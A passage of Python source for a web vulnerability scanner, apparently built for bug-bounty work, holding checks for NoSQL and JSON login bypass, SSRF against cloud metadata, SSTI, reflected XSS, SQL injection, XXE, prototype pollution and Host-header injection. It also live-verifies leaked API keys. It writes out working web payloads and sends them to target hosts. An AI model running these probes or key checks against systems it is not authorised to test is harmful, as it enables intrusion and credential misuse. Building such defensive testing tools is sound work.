    except httpx.HTTPError:
        return None
    if baseline_resp.status_code == 404:
        return None  # this path doesn't exist at all on this host

    try:
        payload_resp = await client.post(url, json=payload_body)
    except httpx.HTTPError:
        return None

    baseline_has_cookie = "set-cookie" in baseline_resp.headers
    payload_has_cookie = "set-cookie" in payload_resp.headers
    status_improved = (
        payload_resp.status_code in (200, 201, 302)
        and baseline_resp.status_code not in (200, 201, 302)
    )
    bypassed = payload_has_cookie and not baseline_has_cookie and status_improved
    return {
        "baseline_status": baseline_resp.status_code,
        "payload_status": payload_resp.status_code,
        "bypassed": bypassed,
    }


# ---------------------------------------------------------------------
# 21. Blind NoSQL injection
# ---------------------------------------------------------------------

async def check_blind_nosql_injection(host: str) -> dict | None:
    """
    Tries a short list of common login-endpoint paths with a MongoDB-
    style operator payload ({field: {"$ne": null}}) in place of real
    credentials. No test account is needed here - a successful bypass
    IS the account access being demonstrated. See _check_login_bypass
    for the baseline-comparison logic that avoids false positives from
    apps that just return 200 for everything.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
            for path in _LOGIN_CANDIDATE_PATHS:
                url = base + path
                for user_field, pass_field in _LOGIN_FIELD_COMBOS:
                    logger.info("detective: checking blind NoSQL injection for %s", url)
                    payload_body = {user_field: {"$ne": None}, pass_field: {"$ne": None}}
                    result = await _check_login_bypass(client, url, user_field, pass_field, payload_body)
                    if result is None:
                        continue
                    if result["bypassed"]:
                        return {
                            "vuln_type": "blind_nosql_injection",
                            "severity": "critical",
                            "evidence": (
                                f"{url}: garbage credentials returned HTTP {result['baseline_status']} "
                                f"with no session cookie, but the NoSQL operator payload "
                                f"{{'{user_field}': {{'$ne': null}}, '{pass_field}': {{'$ne': null}}}} "
                                f"returned HTTP {result['payload_status']} WITH a session cookie set - "
                                f"authentication bypass via NoSQL operator injection."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: blind NoSQL injection check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 22. JSON type confusion
# ---------------------------------------------------------------------
_TYPE_CONFUSION_VARIANTS: list[tuple[str, object]] = [
    ("array_pollution", ["swas-probe-1", "swas-probe-2"]),
    ("boolean_substitution", True),
    ("integer_overflow", 99999999999),
]


async def check_json_type_confusion(host: str) -> dict | None:
    """
    Same candidate paths and confirmation logic as the NoSQL check, but
    the payload substitutes the credential field's TYPE instead of its
    value - an array, a bare boolean, or an oversized integer where the
    backend expects a string. Some JSON parsers (particularly loosely-
    typed ORMs) silently coerce or short-circuit on an unexpected type
    instead of rejecting it, which can skip a string-comparison auth
    check entirely.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False, verify=False) as client:
            for path in _LOGIN_CANDIDATE_PATHS:
                url = base + path
                for user_field, pass_field in _LOGIN_FIELD_COMBOS:
                    for variant_name, variant_value in _TYPE_CONFUSION_VARIANTS:
                        logger.info(
                            "detective: checking JSON type confusion (%s) for %s", variant_name, url
                        )
                        payload_body = {user_field: variant_value, pass_field: variant_value}
                        result = await _check_login_bypass(client, url, user_field, pass_field, payload_body)
                        if result is None:
                            continue
                        if result["bypassed"]:
                            return {
                                "vuln_type": "json_type_confusion",
                                "severity": "critical",
                                "evidence": (
                                    f"{url}: garbage credentials returned HTTP {result['baseline_status']} "
                                    f"with no session cookie, but substituting field types "
                                    f"('{variant_name}': {user_field}={variant_value!r}) returned HTTP "
                                    f"{result['payload_status']} WITH a session cookie set - the backend "
                                    f"appears to mishandle an unexpected JSON type on the auth check."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: JSON type confusion check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 23. HTTP Parameter Pollution (recon-only - see module docstring)
# ---------------------------------------------------------------------

async def check_http_param_pollution(url: str) -> str | None:
    """
    Duplicates the first query parameter on `url` with a second, clearly
    different value, and compares the response to a clean baseline
    request. A status or meaningfully-sized body difference means the
    frontend/backend (or two backend layers, e.g. a CDN and the origin)
    parse duplicate parameters differently - a real signal worth
    pointing manual testing at. Returns a plain string (or None), NOT a
    findings dict: parameter pollution proves a parsing inconsistency
    exists, not that anything is actually bypassable. Confirming a real
    admin-bypass via HPP needs a privileged session to compare against,
    which this project doesn't have test accounts for yet - filing this
    as a standalone finding today would be reporting a parsing quirk,
    not a vulnerability.
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        return None

    param = next(iter(query_params))
    polluted_query = f"{parsed.query}&{param}=swas-hpp-probe-2"
    polluted_url = urlunparse(parsed._replace(query=polluted_query))

    logger.info("detective: checking HTTP parameter pollution for %s", url)
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True, verify=False) as client:
            baseline = await client.get(url)
            polluted = await client.get(polluted_url)
    except httpx.HTTPError:
        return None

    status_changed = baseline.status_code != polluted.status_code
    len_baseline, len_polluted = len(baseline.text), len(polluted.text)
    body_changed = len_baseline > 0 and abs(len_polluted - len_baseline) / len_baseline > 0.05

    if status_changed or body_changed:
        return (
            f"{url}: duplicating param '{param}' changed server behavior "
            f"(status {baseline.status_code}->{polluted.status_code}, body length "
            f"{len_baseline}->{len_polluted}) - possible backend/frontend parsing "
            f"mismatch, worth manual testing with a privileged session for admin-bypass impact"
        )
    return None


# ---------------------------------------------------------------------
# 24. Apache OptionsBleed (CVE-2017-9798)
# ---------------------------------------------------------------------
_OPTIONSBLEED_PROBE_COUNT = 6
_STANDARD_HTTP_METHODS = {
    "GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH",
}


async def check_apache_optionsbleed(host: str) -> dict | None:
    """
    CVE-2017-9798: a specific Apache memory-disclosure bug where a
    misconfigured 'Limit' directive across multiple .htaccess/vhost
    configs causes a freed/uninitialized pointer to leak into the Allow
    header of OPTIONS responses. Detected the same way the original
    disclosure did: send several OPTIONS requests to the same path and
    check whether the Allow header value varies AND contains tokens
    outside the standard HTTP method vocabulary - header reordering
    alone is normal and not a signal, so both conditions are required.
    """
    url = host.rstrip("/") + "/"
    logger.info("detective: checking Apache OptionsBleed for %s", url)
    allow_headers: set[str] = set()
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False) as client:
            for _ in range(_OPTIONSBLEED_PROBE_COUNT):
                try:
                    resp = await client.request("OPTIONS", url)
                except httpx.HTTPError:
                    return None
                allow = resp.headers.get("allow")
                if allow:
                    allow_headers.add(allow)
    except httpx.HTTPError as exc:
        logger.info("detective: OptionsBleed check failed for %s: %s", url, exc)
        return None

    if len(allow_headers) <= 1:
        return None  # consistent Allow header - no variance, no signal

    suspicious = any(
        {t.strip() for t in header_value.split(",")} - _STANDARD_HTTP_METHODS
        for header_value in allow_headers
    )
    if not suspicious:
        return None

    return {
        "vuln_type": "apache_optionsbleed",
        "severity": "high",
        "evidence": (
            f"{url} returned {len(allow_headers)} different Allow header values across "
            f"{_OPTIONSBLEED_PROBE_COUNT} repeated OPTIONS requests, including non-standard "
            f"method tokens: {sorted(allow_headers)[:5]}. Consistent with CVE-2017-9798 "
            f"(Optionsbleed) - an Apache memory disclosure bug."
        ),
    }


# ---------------------------------------------------------------------
# 25. JWT "none"/weak-alg bypass
# ---------------------------------------------------------------------
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


async def check_jwt_alg_confusion(url: str) -> dict | None:
    """
    Looks for a JWT in the response (cookie or body), decodes its header,
    and checks whether the server would plausibly accept a forged token
    signed with `alg: none` or a trivially-guessable HS256 secret.

    This does NOT forge and replay a token against a protected endpoint -
    that crosses from detection into exploitation and needs an
    authenticated session to verify safely. It only flags tokens whose
    header already advertises a weak configuration (alg is genuinely
    "none", or alg is HS256 while the token structure suggests it's used
    for something sensitive), so you know where to spend manual time
    forging and replaying a token yourself.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: JWT check request failed for %s: %s", url, exc)
        return None

    haystack = " ".join(resp.headers.get("set-cookie", "") for _ in [None]) + " " + resp.text[:20000]
    match = _JWT_RE.search(haystack)
    if not match:
        return None

    token = match.group(0)
    header_b64 = token.split(".")[0]
    padded = header_b64 + "=" * (-len(header_b64) % 4)
    try:
        header = json.loads(base64.urlsafe_b64decode(padded))
    except Exception:
        return None

    alg = str(header.get("alg", "")).lower()
    if alg in ("none", ""):
        return {
            "vuln_type": "jwt_none_alg_accepted",
            "severity": "critical",
            "evidence": (
                f"{url} issued a JWT with alg={header.get('alg')!r}. If the server accepts "
                f"a resubmitted token with alg set to 'none' and the signature stripped, "
                f"this is a full authentication bypass. Header: {header}"
            ),
        }
    return None


# ---------------------------------------------------------------------
# 26. Host header injection
# ---------------------------------------------------------------------
async def check_host_header_injection(url: str) -> dict | None:
    """
    Sends a distinctive, attacker-controlled value in the Host header (and
    X-Forwarded-Host, since many apps trust that over Host behind a proxy)
    and checks whether it's reflected unsanitized into the response body
    or into a redirect Location header.

    Reflection is the proof bar here, not just "the request succeeded" -
    a server that reflects the poisoned host is a real password-reset-
    poisoning / cache-poisoning candidate; one that ignores it isn't a
    finding at all, so this stays quiet unless the marker comes back.
    """
    marker = "swas-hhi-probe.invalid"
    parsed = httpx.URL(url)
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=False) as client:
            resp = await client.get(
                url,
                headers={"Host": marker, "X-Forwarded-Host": marker},
            )
    except httpx.HTTPError as exc:
        logger.info("detective: host header injection check failed for %s: %s", url, exc)
        return None

    location = resp.headers.get("location", "")
    body_sample = resp.text[:5000]
    if marker in location:
        return {
            "vuln_type": "host_header_injection",
            "severity": "high",
            "evidence": (
                f"{url}: sending Host/X-Forwarded-Host={marker} caused the server to redirect "
                f"to a Location header containing that value ({location}). Likely password-reset "
                f"link poisoning or open-redirect-via-host vector."
            ),
        }
    if marker in body_sample:
        return {
            "vuln_type": "host_header_injection",
            "severity": "medium",
            "evidence": (
                f"{url}: the spoofed Host/X-Forwarded-Host value ({marker}) was reflected "
                f"directly into the response body (e.g. a canonical link, asset URL, or "
                f"absolute-URL generator using the request Host)."
            ),
        }
    _ = parsed  # kept for future scheme/port-aware variants
    return None


# ---------------------------------------------------------------------
# 27. Reflected SSRF via common callback/fetch parameters
# ---------------------------------------------------------------------
_SSRF_PARAM_NAMES = ["url", "callback", "webhook", "next", "redirect", "target", "dest", "image", "src", "feed"]
_SSRF_INTERNAL_PROBES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/",
    "http://127.0.0.1/",
]


async def check_ssrf_reflected(url: str) -> dict | None:
    """
    Non-blind SSRF only: tries common callback/fetch-style parameter names
    with an internal-looking target (cloud metadata IP, localhost) and
    checks whether the *response itself* comes back containing internal
    content (e.g. AWS metadata IAM/instance-id text). This deliberately
    skips blind/out-of-band SSRF detection - that needs a collaborator
    server you control and manual confirmation, which this pure-Python,
    no-infra check can't safely automate.

    Baseline-diffed against an unmodified request first - "instance-id"
    and similar phrases are specific, but not so specific that they can
    never appear on an unrelated page (an infra/inventory dashboard, for
    instance). Same false-positive lesson as check_ssti: don't trust a
    substring match without ruling out it was already there.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None

    existing_params = dict(parsed.params)
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text[:3000].lower()
            except httpx.HTTPError:
                return None

            for param_name in _SSRF_PARAM_NAMES:
                if param_name not in existing_params:
                    continue
                for probe in _SSRF_INTERNAL_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = probe
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    body = resp.text[:3000].lower()
                    for sig in ("ami-id", "instance-id", "iam/security-credentials"):
                        if sig in body and sig not in baseline_body:
                            return {
                                "vuln_type": "ssrf_reflected_cloud_metadata",
                                "severity": "critical",
                                "evidence": (
                                    f"{test_url}: server-side fetch of parameter '{param_name}' "
                                    f"pointed at the cloud metadata endpoint and the response "
                                    f"body contains {sig!r} (absent from the unmodified baseline "
                                    f"response)."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: SSRF check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 28. Exposed framework debug console
# ---------------------------------------------------------------------
_DEBUG_PATHS: list[tuple[str, str, str]] = [
    # (path, body marker, framework)
    ("/", "Werkzeug Debugger", "Flask/Werkzeug"),
    ("/__debugger__", "Werkzeug Debugger", "Flask/Werkzeug"),
    ("/rails/info/properties", "Rails Info", "Ruby on Rails"),
    ("/_profiler/", "Symfony Profiler", "Symfony"),
    ("/phpinfo.php", "phpinfo()", "PHP"),
    ("/info.php", "phpinfo()", "PHP"),
]


async def check_debug_console_exposure(host: str) -> dict | None:
    """
    Checks a short, fixed list of well-known debug-console/info-disclosure
    paths for framework debuggers left enabled in what looks like a
    production deployment. A Werkzeug debugger with PIN protection
    disabled, or an exposed Rails/Symfony info page, is typically an easy
    path to RCE or full config/secret disclosure - high severity and
    reliably in-scope, unlike generic version-banner findings.

    Control-checked against a deliberately nonexistent path on the same
    host first - these marker strings are fairly specific, but not
    impossible to hit coincidentally (e.g. "phpinfo()" appearing as plain
    text in a PHP tutorial blog post), and some hosts (SPA catch-alls,
    certain WAFs) return 200 with the same generic body for every path
    regardless of what's requested. If the control path also matches,
    the host is match-everything and this isn't a real finding.
    """
    base = host.rstrip("/")
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            control_path = "/swas-nonexistent-probe-" + uuid.uuid4().hex[:8]
            try:
                control_resp = await client.get(base + control_path)
                control_body_lower = control_resp.text[:5000].lower()
            except httpx.HTTPError:
                control_body_lower = ""

            for path, marker, framework in _DEBUG_PATHS:
                try:
                    resp = await client.get(base + path)
                except httpx.HTTPError:
                    continue
                marker_lower = marker.lower()
                if (
                    resp.status_code == 200
                    and marker_lower in resp.text[:5000].lower()
                    and marker_lower not in control_body_lower
                ):
                    return {
                        "vuln_type": "exposed_debug_console",
                        "severity": "critical",
                        "evidence": (
                            f"{base}{path} returned a live {framework} debug/info page "
                            f"(matched marker: {marker!r}, absent from a control request to a "
                            f"nonexistent path on the same host). Often exploitable for RCE "
                            f"(Werkzeug PIN bypass) or full environment/secret disclosure."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: debug console check failed for %s: %s", host, exc)
    return None


# ---------------------------------------------------------------------
# 29. Server-side template injection (SSTI)
# ---------------------------------------------------------------------
def _ssti_probes() -> list[tuple[str, str]]:
    """
    Builds SSTI probes with randomized operands, computed fresh per scan
    rather than the fixed 7*7=49 this shipped with initially. A static
    two-digit result like "49" can trivially appear in a response by
    pure coincidence (a byte count, a CSS value, part of an unrelated
    longer number) with no baseline comparison to rule that out - that
    was a real false-positive bug (see check_ssti's docstring). Using
    two random 2-3 digit operands makes the product effectively unique
    per request, and it's paired with an explicit baseline diff in
    check_ssti itself as defense in depth.
    """
    a = random.randint(37, 97)
    b = random.randint(41, 89)
    product = str(a * b)
    return [
        (f"${{{a}*{b}}}", product),
        (f"#{{{a}*{b}}}", product),
        (f"{{{{{a}*{b}}}}}", product),
        (f"{{{{={a}*{b}}}}}", product),
        (f"<%= {a}*{b} %>", product),
    ]


async def check_ssti(url: str) -> dict | None:
    """
    Appends each SSTI probe as a value on every existing query parameter
    and checks whether the *evaluated* result shows up in the response
    body somewhere the raw payload didn't already appear. This is
    proof-based, not signature-based - a template engine that just
    echoes "{{91*67}}" back verbatim isn't vulnerable, so echoed-but-
    unevaluated payloads are explicitly excluded to avoid false positives
    from any app that reflects input at all (which is most of them).

    Two layers against false positives: (1) operands are randomized per
    scan, so the expected product is different every time and
    effectively unique rather than a common short number like "49" that
    can coincidentally appear anywhere in a page; (2) the expected value
    must be ABSENT from a baseline (unmodified) request to the same URL
    before a match counts - if it's already present without the payload,
    it's coincidence, not evaluation.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_body = baseline_resp.text
            except httpx.HTTPError:
                return None

            for param_name in existing_params:
                for payload, expected in _ssti_probes():
                    if expected in baseline_body:
                        continue  # would coincidentally match even unmodified - skip this operand pair
                    test_params = dict(existing_params)
                    test_params[param_name] = existing_params[param_name] + payload
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    body = resp.text
                    if payload in body:
                        continue  # reflected raw, not evaluated - not a finding
                    if expected in body:
                        return {
                            "vuln_type": "server_side_template_injection",
                            "severity": "critical",
                            "evidence": (
                                f"{test_url}: parameter '{param_name}' with payload {payload!r} "
                                f"caused the literal evaluated result {expected!r} to appear in the "
                                f"response body (payload itself not present unevaluated, and "
                                f"{expected!r} was absent from an unmodified baseline request to "
                                f"the same URL), consistent with server-side template injection / RCE."
                            ),
                        }
    except httpx.HTTPError as exc:
        logger.info("detective: SSTI check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 30. Prototype pollution (JSON body __proto__ injection)
# ---------------------------------------------------------------------
async def check_prototype_pollution(url: str) -> dict | None:
    """
    POSTs a small JSON body containing a __proto__ pollution gadget to
    `url` and checks whether the polluted property (a distinctive marker
    key/value) gets reflected back anywhere in the response - on a
    subsequent unrelated GET to the same host, or directly in the POST
    response itself. Only fires on that positive reflection, not on
    "the request was accepted" (which most JSON APIs will do regardless).
    """
    marker_key = "swasPollutedMarker"
    marker_val = "swas-proto-pollution-proof"
    payload = {"__proto__": {marker_key: marker_val}}

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                post_resp = await client.post(url, json=payload)
            except httpx.HTTPError:
                return None

            if marker_val in post_resp.text:
                return {
                    "vuln_type": "prototype_pollution",
                    "severity": "high",
                    "evidence": (
                        f"{url}: POSTing a __proto__ gadget ({payload}) caused the injected "
                        f"marker value {marker_val!r} to be reflected directly in the response."
                    ),
                }

            # Second signal: a plain, unrelated GET on the same origin picking up
            # the polluted property would indicate the pollution reached shared/
            # global object state, not just this one request's local object.
            try:
                probe_resp = await client.get(url)
            except httpx.HTTPError:
                return None
            if marker_val in probe_resp.text:
                return {
                    "vuln_type": "prototype_pollution",
                    "severity": "critical",
                    "evidence": (
                        f"{url}: after POSTing a __proto__ gadget, a separate follow-up GET to "
                        f"the same URL also returned the injected marker {marker_val!r}, "
                        f"indicating the pollution affected shared/global state rather than "
                        f"just the one request - broader blast radius."
                    ),
                }
    except httpx.HTTPError as exc:
        logger.info("detective: prototype pollution check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 31. Known API key / secret signature leak
# ---------------------------------------------------------------------
# Distinct from check_file_entropy (batch 1), which flags high-entropy
# strings generically. This matches *known, fixed-format* key prefixes
# from real providers, so severity can be set per-provider instead of a
# flat "looks random" guess, and false positives are far rarer.
_API_KEY_SIGNATURES: list[tuple[re.Pattern, str, str]] = [
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS Access Key ID", "critical"),
    (re.compile(r"sk_live_[0-9a-zA-Z]{24,}"), "Stripe Live Secret Key", "critical"),
    (re.compile(r"AIza[0-9A-Za-z_-]{35}"), "Google API Key", "medium"),
    (re.compile(r"xox[baprs]-[0-9A-Za-z-]{10,}"), "Slack Token", "high"),
    (re.compile(r"SK[0-9a-fA-F]{32}"), "Twilio API Key", "high"),
    (re.compile(r"ghp_[0-9A-Za-z]{36}"), "GitHub Personal Access Token", "critical"),
    (re.compile(r"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9[A-Za-z0-9_-]{10,}\.firebase"), "Firebase Service Account JWT", "critical"),
]


async def check_api_key_leak_signature(url: str) -> dict | None:
    """
    Fetches `url` (meant for JS bundles, config endpoints, or any static
    asset) and matches its body against a short list of known, fixed-
    format API key signatures. A match on one of these formats is a
    concrete, provider-identifiable secret - materially different from
    "this string looked randomish" (check_file_entropy), so it's kept as
    its own check with per-provider severity instead of folded in.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            resp = await client.get(url)
    except httpx.HTTPError as exc:
        logger.info("detective: API key signature check failed for %s: %s", url, exc)
        return None

    body = resp.text
    for pattern, provider, severity in _API_KEY_SIGNATURES:
        match = pattern.search(body)
        if match:
            raw_secret = match.group(0)  # only ever held in memory, never persisted
            secret_preview = raw_secret[:8] + "…" + raw_secret[-4:]

            # Live-verify while the full value is still in scope, for the
            # subset of providers where the matched string is a complete,
            # usable credential on its own (see secret_verifier.py's
            # module docstring for why AWS/Twilio are excluded here).
            verdict = await secret_verifier.verify_secret(provider, raw_secret)
            if verdict is None:
                verify_note = " (not independently verifiable from this match alone - needs a paired secret)"
                effective_severity = severity
            elif verdict.get("valid") is True:
                verify_note = f" VERIFIED LIVE: {verdict['note']}"
                effective_severity = "critical"  # a confirmed-live credential always outranks the format's default
            elif verdict.get("valid") is False:
                verify_note = f" VERIFIED DEAD: {verdict['note']}"
                effective_severity = "low"  # keep the finding, don't silently drop it - let triage.py make the final call
            else:
                verify_note = f" (verification inconclusive: {verdict.get('note', 'unknown')})"
                effective_severity = severity

            return {
                "vuln_type": "exposed_api_key",
                "severity": effective_severity,
                "evidence": (
                    f"{url}: found a live-looking {provider} matching its known format "
                    f"({secret_preview}) directly in the response body.{verify_note}"
                ),
            }
    return None


# ---------------------------------------------------------------------
# 32. IDOR candidate flagging (recon-only - see module docstring)
# ---------------------------------------------------------------------
_SEQUENTIAL_ID_RE = re.compile(r"/(?:v\d+/)?(\w*(?:id|user|order|account|invoice|ticket|profile|doc)\w*)/(\d{1,10})(?:/|$|\?)", re.IGNORECASE)


async def check_idor_candidate(url: str) -> str | None:
    """
    Flags URLs whose path contains a small sequential/numeric ID next to
    an identity-shaped segment name (userId, orderId, accountId, etc.).
    Returns a plain string, NOT a findings dict - same reasoning as
    check_waf_fingerprint and check_csp_weakness: a numeric ID in a URL
    is not itself a vulnerability. Confirming IDOR requires comparing
    responses across two different authenticated sessions (attacker
    account vs. victim's resource), which a single-session passive
    scanner can't do safely or reliably. This exists purely to surface
    high-probability candidates so you can spend manual verification
    time efficiently instead of guessing which of hundreds of URLs to
    check by hand - IDOR is consistently one of the highest-payout,
    most-accepted bug classes, so triage speed here matters.
    """
    match = _SEQUENTIAL_ID_RE.search(str(httpx.URL(url).path))
    if not match:
        return None
    segment_name, id_value = match.group(1), match.group(2)
    return f"{url}: IDOR candidate - numeric ID {id_value!r} in segment {segment_name!r}, verify with a second account"


# ---------------------------------------------------------------------
# 33. Reflected XSS
# ---------------------------------------------------------------------
async def check_reflected_xss(url: str) -> dict | None:
    """
    Injects a unique, unlikely-to-collide marker containing raw HTML
    special characters into each existing query parameter, then checks
    whether it comes back completely unescaped in an HTML response.
    Proof bar: the exact raw string (angle brackets, quotes intact) must
    appear verbatim in a text/html response - HTML-entity-encoded
    reflection (e.g. &lt;script&gt;) is explicitly not a match, since
    that's the app doing its job correctly.
    """
    marker_id = uuid.uuid4().hex[:10]
    payload = f'"><svg/onload=alert(/swas{marker_id}/)>'

    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            for param_name in existing_params:
                test_params = dict(existing_params)
                test_params[param_name] = payload
                test_url = parsed.copy_with(params=test_params)
                try:
                    resp = await client.get(test_url)
                except httpx.HTTPError:
                    continue

                content_type = resp.headers.get("content-type", "")
                if "html" not in content_type.lower():
                    continue  # JSON/plain-text APIs aren't a browser-execution context here
                if payload in resp.text:
                    return {
                        "vuln_type": "reflected_xss",
                        "severity": "high",
                        "evidence": (
                            f"{test_url}: parameter '{param_name}' reflected the payload "
                            f"{payload!r} completely unescaped in a text/html response - "
                            f"browser would execute this as markup/script."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: reflected XSS check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 34. Error-based SQL injection
# ---------------------------------------------------------------------
_SQLI_ERROR_SIGNATURES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"you have an error in your sql syntax", re.IGNORECASE), "MySQL"),
    (re.compile(r"warning: mysqli?_", re.IGNORECASE), "MySQL"),
    (re.compile(r"unterminated quoted string", re.IGNORECASE), "SQLite"),
    (re.compile(r"sqlite3\.OperationalError", re.IGNORECASE), "SQLite"),
    (re.compile(r"pg_query\(\)|PostgreSQL.*ERROR|SQLSTATE\[", re.IGNORECASE), "PostgreSQL"),
    (re.compile(r"ORA-\d{5}", re.IGNORECASE), "Oracle"),
    (re.compile(r"Microsoft OLE DB Provider for SQL Server", re.IGNORECASE), "MSSQL"),
    (re.compile(r"Unclosed quotation mark after the character string", re.IGNORECASE), "MSSQL"),
    (re.compile(r"System\.Data\.SqlClient\.SqlException", re.IGNORECASE), "MSSQL"),
]
_SQLI_ERROR_PROBES = ["'", "\"", "')", "\")", "' OR '1'='1"]


async def check_sqli_error_based(url: str) -> dict | None:
    """
    Complements check_blind_sqli_timing (batch 1): instead of a timing
    side-channel, this sends a small set of syntax-breaking probes and
    matches the response against known database error-message
    signatures. Error-based findings are generally higher-confidence and
    easier for a triager to verify than timing-based ones, so this is
    kept as a separate, distinctly-labeled check rather than folded in.
    """
    parsed = httpx.URL(url)
    if not parsed.query:
        return None
    existing_params = dict(parsed.params)

    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            # Baseline first - some apps always show a DB-flavored error page
            # regardless of input, which would otherwise false-positive every param.
            try:
                baseline = await client.get(url)
            except httpx.HTTPError:
                return None
            baseline_body = baseline.text

            for param_name in existing_params:
                for probe in _SQLI_ERROR_PROBES:
                    test_params = dict(existing_params)
                    test_params[param_name] = existing_params[param_name] + probe
                    test_url = parsed.copy_with(params=test_params)
                    try:
                        resp = await client.get(test_url)
                    except httpx.HTTPError:
                        continue
                    for pattern, db_type in _SQLI_ERROR_SIGNATURES:
                        if pattern.search(resp.text) and not pattern.search(baseline_body):
                            return {
                                "vuln_type": "sql_injection_error_based",
                                "severity": "critical",
                                "evidence": (
                                    f"{test_url}: parameter '{param_name}' with probe {probe!r} "
                                    f"triggered a {db_type} error signature not present in the "
                                    f"baseline (unmodified) response."
                                ),
                            }
    except httpx.HTTPError as exc:
        logger.info("detective: error-based SQLi check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 35. XXE (error-based detection only)
# ---------------------------------------------------------------------
_XXE_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///swas-xxe-nonexistent-probe">]>'
    "<root>&xxe;</root>"
)
_XXE_ERROR_SIGNATURES = [
    "no such file", "FileNotFoundException", "ENOENT", "failed to load external entity",
    "cvc-elt", "DOCTYPE is not allowed", "SAXParseException", "XMLSyntaxError",
]


async def check_xxe_error_based(url: str) -> dict | None:
    """
    POSTs a minimal external-entity payload referencing a file path that
    almost certainly doesn't exist, with Content-Type: application/xml.
    This is detection-only, not exfiltration - it never references a
    real, readable file, so there's nothing to leak even if the target
    is vulnerable. A match on an XML-parser-specific error signature
    referencing the entity/file (rather than a generic "bad request")
    is enough to prove the parser attempted external entity resolution,
    which is the vulnerability itself, independent of whether this
    particular probe path exists on disk.

    Baseline-diffed against a plain GET on the same URL first - some of
    these signatures ("no such file", "ENOENT") are generic enough that
    an unrelated 404/error page could already contain them with nothing
    to do with XML at all. Same false-positive lesson as check_ssti.
    """
    try:
        async with httpx.AsyncClient(timeout=_TIMEOUT, verify=False, follow_redirects=True) as client:
            try:
                baseline_resp = await client.get(url)
                baseline_lower = baseline_resp.text.lower()
            except httpx.HTTPError:
                baseline_lower = ""

            try:
                resp = await client.post(
                    url,
                    content=_XXE_PAYLOAD,
                    headers={"Content-Type": "application/xml"},
                )
            except httpx.HTTPError:
                return None

            body_lower = resp.text.lower()
            for sig in _XXE_ERROR_SIGNATURES:
                sig_lower = sig.lower()
                if sig_lower in body_lower and sig_lower not in baseline_lower:
                    return {
                        "vuln_type": "xxe_external_entity_processing",
                        "severity": "high",
                        "evidence": (
                            f"{url}: sending an XML body with an external entity referencing a "
                            f"nonexistent local path triggered a parser error signature "
                            f"({sig!r}, absent from a baseline GET on the same URL), indicating "
                            f"the XML parser attempted to resolve external entities rather than "
                            f"rejecting the DOCTYPE outright."
                        ),
                    }
    except httpx.HTTPError as exc:
        logger.info("detective: XXE check failed for %s: %s", url, exc)
    return None


# ---------------------------------------------------------------------
# 36. Insecure deserialization signature (recon-only - see module docstring)
# ---------------------------------------------------------------------
_DESERIALIZATION_SIGNATURES: list[tuple[re.Pattern, str]] = [
    (re.compile(r"^rO0[A-Za-z0-9+/=]+$"), "Java serialized object (base64, starts with rO0)"),
    (re.compile(r"^(a:\d+:\{|O:\d+:\"|s:\d+:\")"), "PHP serialized object"),
    (re.compile(r"^\x80[\x02-\x05]"), "Python pickle protocol marker"),
    (re.compile(r"^AAEAAAD"), ".NET BinaryFormatter (base64)"),
]


async def check_insecure_deserialization_signature(url: str) -> str | None:
    """
    Passively inspects cookie values and query-string values for known
    serialization-format magic-byte/prefix signatures (Java, PHP, Python
    pickle, .NET BinaryFormatter). Returns a plain string, NOT a
